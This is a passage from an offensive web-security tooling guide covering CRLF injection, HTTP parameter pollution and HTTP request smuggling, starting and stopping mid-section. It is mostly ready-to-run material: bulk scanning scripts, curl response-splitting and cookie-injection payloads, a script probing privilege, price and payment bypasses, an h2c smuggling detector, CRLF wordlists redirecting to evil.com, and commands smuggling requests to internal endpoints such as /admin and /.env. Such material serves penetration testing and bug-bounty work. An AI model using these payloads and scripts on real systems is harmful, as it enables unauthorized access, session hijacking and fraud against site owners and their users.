# ── Full pipeline: discover URLs then scan for CRLF ───────────────
gau target.com | \
    grep -v '\.(jpg|png|css|js|gif)' | \
    crlfuzz -u - -s -o crlf_all.txt
```

### CRLFuzz Payloads It Tests Internally

CRLFuzz tries these variants for each URL:

```
%0d%0a                    standard CR+LF
%0a                       LF only
%0d                       CR only
%0D%0A                    uppercase
%0d%0a%20                 CRLF + space
%0d%0aSet-Cookie:crlf=1   header injection test
%23%0d%0a                 # then CRLF
%3f%0d%0a                 ? then CRLF
%0d%0a%09                 CRLF + tab
\r\n                      literal (some parsers)
\u000d\u000a              unicode
%E5%98%8A%E5%98%8D        multi-byte trick
```

### Bulk CRLF Pipeline Script

```bash
#!/bin/bash
# crlf_bulk_scan.sh — Full CRLF injection scanning pipeline
# Usage: bash crlf_bulk_scan.sh target.com

TARGET="$1"
OUT="crlf_results_${TARGET}"
mkdir -p "$OUT"

echo "[*] Step 1: Collecting URLs..."
{
  gau "$TARGET" 2>/dev/null
  waybackurls "$TARGET" 2>/dev/null
} | sort -u | \
  grep -v '\.\(jpg\|jpeg\|png\|gif\|css\|ico\|woff\|svg\|ttf\|eot\)' | \
  tee "$OUT/all_urls.txt"

echo "[+] URLs collected: $(wc -l < "$OUT/all_urls.txt")"

echo "[*] Step 2: Filtering to live URLs..."
cat "$OUT/all_urls.txt" | \
  httpx -silent -status-code -mc 200,301,302,403 | \
  awk '{print $1}' > "$OUT/live_urls.txt"

echo "[+] Live URLs: $(wc -l < "$OUT/live_urls.txt")"

echo "[*] Step 3: Running CRLFuzz..."
crlfuzz -l "$OUT/live_urls.txt" \
        -s \
        -c 20 \
        -o "$OUT/crlf_findings.txt"

echo "[*] Step 4: Running custom CRLF probes..."
while IFS= read -r url; do
  # Test each parameter position
  params=$(echo "$url" | grep -o '[?&][^=&]*=' | tr -d '?&=' | tr '\n' ' ')
  for param in $params; do
    test_url="${url/$param=*/$param=%0d%0aSet-Cookie:crlf_test=1}"
    response=$(curl -sk -o /dev/null -w "%{http_code}:%{size_header}" \
               -H "Cookie: session=test" \
               --max-time 10 "$test_url")
    echo "$response $test_url" >> "$OUT/custom_probes.txt"
  done
done < "$OUT/live_urls.txt"

echo "[+] Done. Results in $OUT/"
echo "[+] CRLF findings: $OUT/crlf_findings.txt"
```

---

## 6.4 Manual CRLF Testing with curl

curl lets you send raw CRLF bytes manually — essential for confirming findings.

```bash
# ── Basic CRLF test in URL parameter ─────────────────────────────
curl -v "https://target.com/redirect?url=https://safe.com%0d%0aSet-Cookie:%20admin=1"

# Expected: Look for "Set-Cookie: admin=1" in response headers

# ── CRLF in User-Agent header ─────────────────────────────────────
curl -v "https://target.com/" \
     -A "Mozilla/5.0%0d%0aInjected-Header: evil"

# ── CRLF header injection with full response splitting ─────────────
# Inject a second complete HTTP response
PAYLOAD='https://safe.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected!</h1>'
curl -v "https://target.com/redirect?url=${PAYLOAD}"

# ── CRLF in cookie value ──────────────────────────────────────────
curl -v "https://target.com/api" \
     -H "Cookie: session=abc%0d%0aX-Injected:%20header"

# ── CRLF with newline-only (LF without CR) ────────────────────────
curl -v "https://target.com/?lang=en%0aSet-Cookie:%20test=1"

# ── Test CRLF in POST body that gets reflected to headers ─────────
curl -v -X POST "https://target.com/api/setlang" \
     -d "lang=en%0d%0aX-Injected:%20evil" \
     -H "Content-Type: application/x-www-form-urlencoded"

# ── Raw socket CRLF injection (bypasses curl encoding) ────────────
# Use printf to send literal bytes
printf 'GET /?param=value\r\nX-Injected: header\r\n\r\n' | \
  openssl s_client -connect target.com:443 -quiet 2>/dev/null

# ── Check response headers for injection success ──────────────────
curl -sI "https://target.com/?lang=en%0d%0aSet-Cookie:%20injected=1" | \
  grep -i "set-cookie\|injected"
```

---

## 6.5 CRLF Nuclei Templates

```yaml
# crlf-header-injection.yaml
id: crlf-header-injection

info:
  name: CRLF Header Injection
  author: security-researcher
  severity: medium
  description: |
    Detects CRLF injection in HTTP parameters by checking if injected
    headers appear in the response. Tests both %0d%0a and %0a variants.
  reference:
    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
  tags: crlf,injection,header

http:
  - method: GET
    path:
      - "{{BaseURL}}/?{{params}}=test%0d%0aX-Crlf-Test:%20crlfuzz"
      - "{{BaseURL}}/?{{params}}=test%0aX-Crlf-Test:%20crlfuzz"
      - "{{BaseURL}}/redirect?url=https://safe.com%0d%0aX-Crlf-Test:%20crlfuzz"
      - "{{BaseURL}}/lang?lang=en%0d%0aX-Crlf-Test:%20crlfuzz"

    payloads:
      params:
        - redirect
        - url
        - lang
        - next
        - return
        - callback
        - ref
        - page
        - path

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - "X-Crlf-Test:\\s*crlfuzz"
        name: injected-header-found

    extractors:
      - type: regex
        part: header
        name: injected-headers
        regex:
          - "X-Crlf-Test:.*"
```

```yaml
# crlf-cookie-injection.yaml
id: crlf-cookie-injection

info:
  name: CRLF Injection leading to Cookie Setting
  author: security-researcher
  severity: high
  description: |
    Detects CRLF injection that allows setting arbitrary cookies,
    potentially enabling session fixation or privilege escalation.
  tags: crlf,cookie,session-fixation

http:
  - method: GET
    path:
      - "{{BaseURL}}/?{{params}}=value%0d%0aSet-Cookie:%20crlf_test=1;%20Path=/"

    payloads:
      params:
        - redirect
        - url
        - next
        - return_url
        - lang
        - ref
        - page
        - location
        - dest
        - destination

    matchers:
      - type: regex
        part: header
        regex:
          - "Set-Cookie:.*crlf_test=1"
        name: cookie-injection-confirmed
```

---

## 6.6 Arjun — Complete Guide

### Installation

```bash
pip install arjun
# OR
git clone https://github.com/s0md3v/Arjun.git && cd Arjun && pip install .
```

### Full Command Reference

```bash
# ── GET parameter discovery ────────────────────────────────────────
arjun -u "https://target.com/search"

# ── POST parameter discovery ──────────────────────────────────────
arjun -u "https://target.com/login" -m POST

# ── JSON parameter discovery ──────────────────────────────────────
arjun -u "https://target.com/api" -m JSON

# ── XML body parameters ───────────────────────────────────────────
arjun -u "https://target.com/api" -m XML

# ── Authenticated request ─────────────────────────────────────────
arjun -u "https://target.com/api" \
      -m GET \
      --headers "Cookie: session=abc123" \
      --headers "Authorization: Bearer TOKEN"

# ── Custom wordlist ───────────────────────────────────────────────
arjun -u "https://target.com/api" \
      -w ~/wordlists/params.txt

# ── Multiple URLs from file ───────────────────────────────────────
arjun -i urls.txt -m GET -o results.json

# ── Increase thread count ─────────────────────────────────────────
arjun -u "https://target.com/" -t 20

# ── Stable mode (slower, more accurate) ───────────────────────────
arjun -u "https://target.com/" --stable

# ── Through Burp proxy ────────────────────────────────────────────
arjun -u "https://target.com/" \
      --proxies "http://127.0.0.1:8080"

# ── Quiet (no banner, only results) ──────────────────────────────
arjun -u "https://target.com/" -q

# ── Chunk size (params per request, default 500) ─────────────────
arjun -u "https://target.com/" --chunk-size 250

# ── Passive (just report, don't send requests) ────────────────────
# Useful for checking discovered params against known lists
arjun -u "https://target.com/" --passive

# ── Delay between requests (rate limiting) ────────────────────────
arjun -u "https://target.com/" --stable --delay 500
```

### Arjun → HPP Pipeline Script

```python
#!/usr/bin/env python3
# arjun_to_hpp.py — Take Arjun output, generate + test HPP payloads

import json
import sys
import requests
import urllib3
urllib3.disable_warnings()

HPP_ATTACK_MAP = {
    "role":       (["user", "admin"],          "Privilege Escalation"),
    "admin":      (["0", "1"],                 "Admin Flag Bypass"),
    "debug":      (["false", "true"],          "Debug Enable"),
    "status":     (["inactive", "active"],     "Status Manipulation"),
    "verified":   (["false", "true"],          "Verification Bypass"),
    "price":      (["100", "0"],               "Price Manipulation"),
    "amount":     (["100", "0"],               "Amount Bypass"),
    "discount":   (["0", "100"],               "Discount Abuse"),
    "redirect":   (["https://safe.com",
                    "https://evil.com"],        "Open Redirect"),
    "email":      (["victim@mail.com",
                    "attacker@evil.com"],       "Email Injection"),
    "type":       (["user", "admin"],          "Type Escalation"),
    "confirmed":  (["false", "true"],          "Confirmation Bypass"),
    "approved":   (["0", "1"],                 "Approval Bypass"),
    "paid":       (["false", "true"],          "Payment Bypass"),
    "scope":      (["read", "write:admin"],    "Scope Escalation"),
}

def baseline(url, param, val, session):
    try:
        r = session.get(url, params={param: val},
                        timeout=10, verify=False)
        return r.status_code, len(r.text), r.text[:300]
    except Exception as e:
        return None, None, str(e)

def polluted(url, param, v1, v2, session):
    # Build URL manually to force duplicate params
    test_url = f"{url}?{param}={v1}&{param}={v2}"
    try:
        r = session.get(test_url, timeout=10, verify=False)
        return r.status_code, len(r.text), r.text[:300]
    except Exception as e:
        return None, None, str(e)

def run(arjun_file, cookies=None):
    session = requests.Session()
    if cookies:
        for k, v in (c.split("=", 1) for c in cookies.split(";")):
            session.cookies.set(k.strip(), v.strip())

    with open(arjun_file) as f:
        data = json.load(f)

    findings = []

    for url, info in data.items():
        params = info.get("params", [])
        print(f"\n[Target] {url}")
        print(f"[Params] {params}")

        for param in params:
            if param not in HPP_ATTACK_MAP:
                continue
            values, attack = HPP_ATTACK_MAP[param]
            v1, v2 = values[0], values[1]

            b_code, b_len, _ = baseline(url, param, v1, session)
            p_code, p_len, p_body = polluted(url, param, v1, v2, session)

            changed = (b_code != p_code) or (abs((b_len or 0) - (p_len or 0)) > 50)

            if changed:
                print(f"  [!!!] HPP CHANGE on param '{param}' ({attack})")
                print(f"        Baseline: {b_code} / {b_len}b")
                print(f"        Polluted: {p_code} / {p_len}b")
                findings.append({
                    "url": url,
                    "param": param,
                    "attack": attack,
                    "baseline": {"code": b_code, "len": b_len},
                    "polluted": {"code": p_code, "len": p_len},
                    "snippet": p_body,
                })

    print(f"\n[Summary] {len(findings)} HPP findings")
    with open("hpp_findings.json", "w") as f:
        json.dump(findings, f, indent=2)
    print("[+] Saved: hpp_findings.json")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 arjun_to_hpp.py arjun_results.json [cookies]")
        sys.exit(1)
    cookies = sys.argv[2] if len(sys.argv) > 2 else None
    run(sys.argv[1], cookies)
```

---

## 6.7 smuggler.py — Complete Guide

### Installation & Structure

```bash
git clone https://github.com/defparam/smuggler.git
cd smuggler
# No extra dependencies beyond Python 3 + socket
# File structure:
# smuggler/
# ├── smuggler.py        ← main script
# ├── payloads/          ← payload text files
# │   ├── CLTE.txt       ← CL.TE probes
# │   ├── TECL.txt       ← TE.CL probes
# │   └── TETE.txt       ← TE.TE obfuscation probes
# └── README.md
```

### Full Command Reference

```bash
# ── Basic scan (auto-detects type) ────────────────────────────────
python3 smuggler.py -u "https://target.com/"

# ── Verbose (show each probe) ─────────────────────────────────────
python3 smuggler.py -u "https://target.com/" -v

# ── Specify type only ─────────────────────────────────────────────
python3 smuggler.py -u "https://target.com/" --type CL.TE
python3 smuggler.py -u "https://target.com/" --type TE.CL
python3 smuggler.py -u "https://target.com/" --type TE.TE

# ── Custom timeout per probe ──────────────────────────────────────
python3 smuggler.py -u "https://target.com/" -t 15

# ── Custom HTTP method ────────────────────────────────────────────
python3 smuggler.py -u "https://target.com/" -m POST

# ── Add extra headers ─────────────────────────────────────────────
python3 smuggler.py -u "https://target.com/" \
    -H "Cookie: session=abc123" \
    -H "Authorization: Bearer TOKEN"

# ── Output to file ────────────────────────────────────────────────
python3 smuggler.py -u "https://target.com/" \
    -o smuggler_results.txt

# ── Pipe in URLs ──────────────────────────────────────────────────
cat targets.txt | while read url; do
    python3 smuggler.py -u "$url" -t 12 \
        -o "results/$(echo $url | md5sum | cut -c1-8).txt"
    sleep 3
done

# ── Test with specific payload file ───────────────────────────────
python3 smuggler.py -u "https://target.com/" \
    -x payloads/CLTE.txt

# ── All obfuscation variants for TE.TE ───────────────────────────
python3 smuggler.py -u "https://target.com/" --type TE.TE -v
# This cycles through all variants in payloads/TETE.txt:
# Transfer-Encoding: xchunked
# Transfer-Encoding: x-chunked
# Transfer-Encoding: chunked, dav
# Transfer-Encoding: CHUNKED
# etc.
```

### Understanding smuggler.py Output

```
[INFO] Scanning https://target.com/
[INFO] Trying CLTE...          ← Starting CL.TE probe
[!] Timed out on: CLTE-0       ← Timing anomaly on probe variant 0
[!!!] Potential CLTE!           ← VULNERABILITY INDICATOR
[INFO] Trying TECL...          ← Starting TE.CL probe
[INFO] TECL-0: 200             ← Normal response, no anomaly
[INFO] Trying TETE...          ← Starting TE.TE probe
[!] Timed out on: TETE-3       ← TE.TE variant 3 caused timeout
[!!!] Potential TETE!           ← TE.TE VULNERABILITY INDICATOR
```

### Custom Bulk Scan with Triage

```bash
#!/bin/bash
# smuggler_bulk.sh — Scan targets, triage results, generate PoC
TARGET_FILE="$1"
OUT="smuggler_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"/{raw,vulnerable,poc}

while IFS= read -r url; do
    [ -z "$url" ] && continue
    slug=$(echo "$url" | md5sum | cut -c1-8)
    out_file="$OUT/raw/${slug}.txt"

    echo "[*] Scanning: $url"
    timeout 120 python3 ~/sec-tools/smuggler/smuggler.py \
        -u "$url" -t 12 -v \
        -o "$out_file" 2>&1

    # Triage
    if grep -qi "Potential\|VULNERABLE\|!!!" "$out_file" 2>/dev/null; then
        echo "[!!!] VULNERABLE: $url"
        cp "$out_file" "$OUT/vulnerable/${slug}_VULN.txt"
        echo "$url" >> "$OUT/CONFIRMED_VULNERABLE.txt"

        # Generate exploit PoC
        TYPE=$(grep -oi "CL\.TE\|TE\.CL\|TE\.TE" "$out_file" | head -1)
        cat > "$OUT/poc/${slug}_poc.md" << EOF
# HRS PoC — $url
## Type: $TYPE
## Detected: $(date)

### Timing Probe (sent to confirm)
\`\`\`http
POST / HTTP/1.1
Host: $(echo "$url" | sed 's|https\?://||' | cut -d/ -f1)
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
\`\`\`

### Next Steps
1. Open Burp Suite → Repeater
2. Paste above request (HTTP/1.1 mode, disable auto-CL)
3. Confirm with differential response method
4. Build exploit chain
EOF
    fi

    sleep 5
done < "$TARGET_FILE"

echo ""
echo "[+] Scan complete"
echo "[+] Vulnerable targets: $(wc -l < "$OUT/CONFIRMED_VULNERABLE.txt" 2>/dev/null || echo 0)"
echo "[+] Output: $OUT/"
```

---

## 6.8 h2csmuggler — Complete Guide

### Installation

```bash
git clone https://github.com/BishopFox/h2csmuggler.git
cd h2csmuggler
pip install h2 hyperframe hpack
python3 h2csmuggler.py --help
```

### Full Command Reference

```bash
# ── Test if h2c upgrade is accepted ──────────────────────────────
python3 h2csmuggler.py --test "https://target.com/"
# Output:
# [INFO] Testing h2c on target.com
# [PASS] h2c stream ACCEPTED — target may be vulnerable!
# [FAIL] h2c stream rejected — not vulnerable via h2c

# ── Smuggle GET request ───────────────────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --target "https://target.com/admin" \
    -X GET

# ── Smuggle POST with body ────────────────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --target "https://target.com/api/internal" \
    -X POST \
    -d "action=getUsers" \
    -H "Content-Type: application/x-www-form-urlencoded"

# ── Smuggle with custom headers ────────────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --target "https://target.com/admin" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "Host: localhost"

# ── Verbose mode (show H2 frames) ────────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --target "https://target.com/admin" \
    -v

# ── Through Burp proxy ────────────────────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --target "https://target.com/admin" \
    --proxy "http://127.0.0.1:8080"

# ── Wordlist of paths to smuggle to ───────────────────────────────
python3 h2csmuggler.py \
    --smuggle-through "https://target.com/" \
    --wordlist ~/wordlists/admin_paths.txt

# ── Bulk test multiple targets ────────────────────────────────────
while read url; do
    echo "Testing: $url"
    python3 h2csmuggler.py --test "$url" 2>/dev/null
    sleep 2
done < targets.txt

# ── Test common internal endpoints after h2c confirmed ────────────
ENDPOINTS=("/admin" "/.env" "/api/internal" "/actuator" "/metrics")
TARGET="https://target.com"
for ep in "${ENDPOINTS[@]}"; do
    echo "Smuggling to: $ep"
    python3 h2csmuggler.py \
        --smuggle-through "$TARGET/" \
        --target "${TARGET}${ep}" \
        -X GET 2>/dev/null
    sleep 1
done
```

### h2c Detection Script (raw sockets)

```python
#!/usr/bin/env python3
"""
h2c_raw_detector.py — Raw socket h2c upgrade detection + CRLF injection test
Tests if server supports h2c upgrade (cleartext HTTP/2), which enables
a different class of request smuggling attacks.
"""

import socket
import ssl
import sys
import time

def banner():
    print("""
 ██╗  ██╗██████╗  ██████╗    ██████╗ ███████╗████████╗███████╗
 ██║  ██║╚════██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝
 ███████║ █████╔╝██║         ██║  ██║█████╗     ██║   ███████╗
 ██╔══██║██╔═══╝ ██║         ██║  ██║██╔══╝     ██║   ╚════██║
 ██║  ██║███████╗╚██████╗    ██████╔╝███████╗   ██║   ███████║
 ╚═╝  ╚═╝╚══════╝ ╚═════╝    ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝
    h2c Upgrade Detector + CRLF Injection Tester
""")

def make_socket(host, port, use_ssl=True):
    sock = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock

def test_h2c_upgrade(host, port, path="/"):
    """
    Send HTTP/1.1 Upgrade: h2c request.
    RFC 7540 says server SHOULD respond 101 if it supports h2c.
    """
    # HTTP2-Settings is base64 of a minimal SETTINGS frame (empty)
    upgrade_request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Upgrade: h2c\r\n"
        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
        f"Connection: Upgrade, HTTP2-Settings\r\n"
        f"\r\n"
    ).encode()

    print(f"\n[*] Sending h2c Upgrade request to {host}:{port}")
    print(f"    Request bytes:\n")
    # Show the CRLF structure explicitly
    for line in upgrade_request.decode().split('\r\n'):
        print(f"    {repr(line + chr(13) + chr(10))}")

    try:
        sock = make_socket(host, port)
        sock.sendall(upgrade_request)
        response = b""
        sock.settimeout(8)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 2000:
                    break
        except socket.timeout:
            pass

        response_str = response.decode('utf-8', errors='replace')
        first_line = response_str.split('\r\n')[0] if response_str else "(no response)"

        print(f"\n[*] Response first line: {first_line!r}")

        if "101" in first_line:
            print(f"[!!!] H2C UPGRADE ACCEPTED → VULNERABILITY CONFIRMED!")
            print(f"      Server supports h2c, enabling HTTP/2 request smuggling")
            return True
        elif "400" in first_line:
            print(f"[-] h2c rejected (400 Bad Request)")
        elif "200" in first_line:
            print(f"[-] Server ignored upgrade, returned 200")
        else:
            print(f"[-] Unexpected response: {first_line}")

        sock.close()
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        return False

def test_crlf_in_upgrade(host, port, path="/"):
    """
    Test CRLF injection within the h2c upgrade headers.
    Inject \r\n into HTTP2-Settings to see if headers bleed.
    """
    # Inject CRLF into HTTP2-Settings value
    crlf_payloads = [
        # Standard CRLF after value
        (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nX-CRLF-Test: injected\r\n"
            f"Connection: Upgrade\r\n"
            f"\r\n"
        ),
        # CRLF in Upgrade value
        (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Upgrade: h2c\r\nX-CRLF-Test: injected\r\n"
            f"Connection: Upgrade\r\n"
            f"\r\n"
        ),
    ]

    print(f"\n[*] Testing CRLF injection in h2c headers...")
    for i, payload in enumerate(crlf_payloads, 1):
        print(f"\n    Payload {i}:")
        for line in payload.split('\r\n'):
            print(f"    | {line!r}")

        try:
            sock = make_socket(host, port)
            sock.sendall(payload.encode())
            response = b""
            sock.settimeout(5)
            try:
                response = sock.recv(4096)
            except socket.timeout:
                pass

            resp_str = response.decode('utf-8', errors='replace')
            if 'X-CRLF-Test' in resp_str or 'injected' in resp_str.lower():
                print(f"[!!!] CRLF INJECTION REFLECTED in response!")
            else:
                print(f"[-] No CRLF reflection detected")

            sock.close()
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    banner()
    if len(sys.argv) < 2:
        print("Usage: python3 h2c_raw_detector.py <host> [port]")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443

    if test_h2c_upgrade(host, port):
        test_crlf_in_upgrade(host, port)
```

---

## 6.9 ffuf — HPP & CRLF Fuzzing

### Installation

```bash
go install github.com/ffuf/ffuf/v2@latest
# or download binary
wget -qO ffuf.tar.gz \
  https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz
tar -xzf ffuf.tar.gz && sudo mv ffuf /usr/local/bin/
ffuf -V
```

### Complete Usage Reference

```bash
# ════════════════════════════════════════════════════
# PARAMETER DISCOVERY (prerequisite for HPP)
# ════════════════════════════════════════════════════

# Discover GET params
ffuf -u "https://target.com/api?FUZZ=test" \
     -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -fc 404 -mc all -v

# Discover POST params
ffuf -u "https://target.com/login" \
     -X POST \
     -d "FUZZ=test" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -w params.txt \
     -fc 400,404

# Discover JSON keys
ffuf -u "https://target.com/api" \
     -X POST \
     -d '{"FUZZ":"test"}' \
     -H "Content-Type: application/json" \
     -w params.txt \
     -fc 400

# ════════════════════════════════════════════════════
# HPP FUZZING
# ════════════════════════════════════════════════════

# Fuzz second value of duplicate param
ffuf -u "https://target.com/?role=user&role=FUZZ" \
     -w ~/wordlists/hpp_values.txt \
     -mc all -fc 200

# Clusterbomb — fuzz both param name and value
ffuf -u "https://target.com/?PARAM=normal&PARAM=EVIL" \
     -w params.txt:PARAM \
     -w values.txt:EVIL \
     -mode clusterbomb \
     -fc 400,404 \
     -o hpp_results.json -of json

# HPP in POST body (manual duplicate)
ffuf -u "https://target.com/update" \
     -X POST \
     -d "role=user&role=FUZZ&username=alice" \
     -w ~/wordlists/hpp_values.txt \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Cookie: session=abc123" \
     -fr "Invalid\|Error\|Bad Request"

# ════════════════════════════════════════════════════
# CRLF FUZZING WITH FFUF
# ════════════════════════════════════════════════════

# Create CRLF payload wordlist
cat > /tmp/crlf_payloads.txt << 'EOF'
%0d%0aX-CRLF-Test: injected
%0aX-CRLF-Test: injected
%0d%0aSet-Cookie: admin=1
%0d%0a%0d%0a<h1>CRLF</h1>
%0D%0AX-CRLF-Test: injected
%0d%0a X-CRLF-Test: injected
%0d%0aContent-Length: 0%0d%0a%0d%0a
\r\nX-CRLF-Test: injected
%E5%98%8A%E5%98%8DX-CRLF-Test: injected
%23%0d%0aX-CRLF-Test: injected
%3f%0d%0aX-CRLF-Test: injected
%0d%0aLocation: https://evil.com
EOF

# Fuzz URL params for CRLF
ffuf -u "https://target.com/?redirect=https://safe.comFUZZ" \
     -w /tmp/crlf_payloads.txt \
     -mc all \
     -mr "X-CRLF-Test" \
     -v

# Fuzz all parameters
ffuf -u "https://target.com/?PARAM=https://safe.comFUZZ" \
     -w params.txt:PARAM \
     -w /tmp/crlf_payloads.txt:FUZZ \
     -mode clusterbomb \
     -mr "X-CRLF-Test|Set-Cookie.*admin"

# ════════════════════════════════════════════════════
# RESPONSE FILTERING FOR ANOMALY DETECTION
# ════════════════════════════════════════════════════

# Filter by response size (baseline = 1234)
ffuf -u "https://target.com/?FUZZ=admin" \
     -w params.txt \
     -fs 1234

# Match responses containing admin content
ffuf -u "https://target.com/?role=user&role=FUZZ" \
     -w ~/wordlists/hpp_values.txt \
     -mr "admin\|dashboard\|panel\|Delete User"

# Calibrate auto-filter
ffuf -u "https://target.com/?FUZZ=test" \
     -w params.txt \
     -ac  # auto-calibrate

# Rate limiting (bug bounty safe)
ffuf -u "https://target.com/?FUZZ=test" \
     -w params.txt \
     -rate 5 \
     -p 0.2
```

---

## 6.10 httpx — Recon & HRS Candidate Finding

### Installation

```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

### Complete Usage for HRS Recon

```bash
# ── Basic probing ─────────────────────────────────────────────────
cat targets.txt | httpx -title -status-code -web-server -tech-detect

# ── Detect HTTP/2 (HRS downgrade attack surface) ──────────────────
cat targets.txt | httpx -http2 -status-code -web-server

# ── Get response headers (look for Via, X-Served-By, CF-Ray) ─────
cat targets.txt | httpx \
    -include-response-header \
    -status-code \
    -silent \
    -o headers.txt

# ── Filter for CDN/proxy-fronted targets ──────────────────────────
cat targets.txt | httpx \
    -match-string "via:\|x-served-by:\|cf-ray:\|x-amz-cf\|x-cache" \
    -silent \
    -o proxy_targets.txt

# ── JSON output for programmatic parsing ─────────────────────────
cat targets.txt | httpx \
    -json \
    -include-all-headers \
    -status-code \
    -web-server \
    -tech-detect \
    -http2 \
    -o httpx_full.json

# ── Find mismatched server stacks (nginx proxy + PHP backend) ─────
cat targets.txt | httpx \
    -json \
    -web-server \
    -tech-detect | \
    python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line.strip())
        srv = (d.get('webserver') or '').lower()
        tech = [t.lower() for t in (d.get('technologies') or [])]
        # nginx fronting PHP = potential HRS
        if 'nginx' in srv and any('php' in t for t in tech):
            print(f'[HRS CANDIDATE] {d[\"url\"]}  server={srv}  tech={tech}')
    except: pass
"

# ── Extract all redirect chains ───────────────────────────────────
cat targets.txt | httpx \
    -follow-redirects \
    -location \
    -status-code \
    -silent

# ── Check specific HRS-related headers ────────────────────────────
cat targets.txt | httpx \
    -probe \
    -include-response-header \
    -silent | \
    grep -i "transfer-encoding\|connection:\|keep-alive\|via:"

# ── Fast bulk status check ────────────────────────────────────────
cat targets.txt | httpx \
    -silent \
    -status-code \
    -mc 200,301,302,403 \
    -threads 50 \
    -rate-limit 100 \
    -o live_targets.txt
```

### httpx → HRS Candidate Filter Script

```python
#!/usr/bin/env python3
# httpx_hrs_filter.py — Parse httpx JSON, score HRS risk
# Usage: python3 httpx_hrs_filter.py httpx_full.json

import json
import sys

PROXY_SIGNALS = [
    'via', 'x-served-by', 'cf-ray', 'x-amz-cf-id',
    'x-cache', 'x-varnish', 'x-forwarded-server',
    'fastly-', 'akamai', 'x-cdn', 'x-proxy',
    'x-backend', 'x-edge',
]

PROXY_SERVERS = [
    'nginx', 'haproxy', 'varnish', 'squid', 'cloudflare',
    'apache traffic server', 'envoy', 'traefik', 'caddy',
    'aws', 'fastly', 'akamai',
]

results = []
with open(sys.argv[1] if len(sys.argv) > 1 else "httpx_full.json") as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
        except json.JSONDecodeError:
            continue

        url     = entry.get("url", "")
        server  = (entry.get("webserver") or "").lower()
        tech    = [t.lower() for t in (entry.get("technologies") or [])]
        headers = {k.lower(): v.lower()
                   for k, v in (entry.get("headers") or {}).items()}
        http2   = entry.get("http2", False)

        score = 0
        reasons = []

        # Check proxy signal headers
        for sig in PROXY_SIGNALS:
            for hdr in headers:
                if sig in hdr:
                    score += 2
                    reasons.append(f"header: {hdr}={headers[hdr][:40]}")

        # Check proxy server type
        for ps in PROXY_SERVERS:
            if ps in server:
                score += 3
                reasons.append(f"server: {server}")
                break

        # HTTP/2 downgrade surface
        if http2:
            score += 2
            reasons.append("http2 supported → downgrade attack surface")

        # Mismatched stack
        if "nginx" in server and any("php" in t for t in tech):
            score += 4
            reasons.append("nginx (proxy) + PHP (backend) — classic HRS setup")

        if "apache" in server and any("node" in t for t in tech):
            score += 3
            reasons.append("apache (proxy) + Node.js — potential mismatch")

        # Transfer-Encoding passthrough
        if "transfer-encoding" in headers:
            score += 1
            reasons.append(f"TE header in response: {headers['transfer-encoding']}")

        if score > 0:
            results.append({
                "url": url,
                "score": score,
                "server": server,
                "http2": http2,
                "reasons": reasons,
            })

results.sort(key=lambda x: x["score"], reverse=True)

print(f"\n{'='*65}")
print(f"  HRS CANDIDATE REPORT — {len(results)} targets")
print(f"{'='*65}")
for r in results:
    print(f"\n  Score {r['score']:2d} | {'HTTP/2' if r['http2'] else '      '} | {r['url']}")
    for reason in r['reasons']:
        print(f"          → {reason}")

# Write top candidates to file
with open("hrs_candidates.txt", "w") as f:
    for r in results:
        f.write(r["url"] + "\n")
print(f"\n[+] Saved to hrs_candidates.txt")
```

---

## 6.11 Nuclei — Complete Guide

### Installation & Templates

```bash
# Install
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates
nuclei -update-templates

# List HRS templates
nuclei -tl | grep -i "smuggl\|desync\|crlf\|hpp"

# Template locations
ls ~/.local/nuclei-templates/http/vulnerabilities/http-request-smuggling/
ls ~/.local/nuclei-templates/http/vulnerabilities/crlf-injection/
```

### Full Command Reference

```bash
# ── Single target HRS scan ────────────────────────────────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/http-request-smuggling/

# ── Single target CRLF scan ───────────────────────────────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/crlf-injection/

# ── Both HRS + CRLF on target ────────────────────────────────────
nuclei -u "https://target.com" \
       -t http/vulnerabilities/http-request-smuggling/ \
       -t http/vulnerabilities/crlf-injection/

# ── Bulk scan from file ───────────────────────────────────────────
nuclei -l targets.txt \
